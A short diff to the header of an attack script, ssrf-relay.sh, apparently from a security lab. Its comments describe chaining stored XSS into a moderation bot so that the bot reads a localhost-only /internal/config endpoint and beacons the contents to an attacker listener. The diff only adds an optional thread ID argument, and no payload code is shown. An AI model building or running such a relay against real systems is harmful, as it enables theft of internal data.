@@ -2,7 +2,7 @@
 # Breach: stored-xss-bot-ssrf
 # Turns the moderation bot into an SSRF proxy via a stored-XSS fetch-and-relay
 # payload; the bot reads localhost-only /internal/config and beacons the body.
-# Usage: ./ssrf-relay.sh <base_url> <cookie_jar> <listener_host:port>
+# Usage: ./ssrf-relay.sh <base_url> <cookie_jar> <listener_host:port> [<thread_id>] (default: bbeo32ucx0a65b8)
 set -euo pipefail
 BASE="${1:-http://localhost:4942}"
 JAR="${2:-cookies_jdoe.txt}"
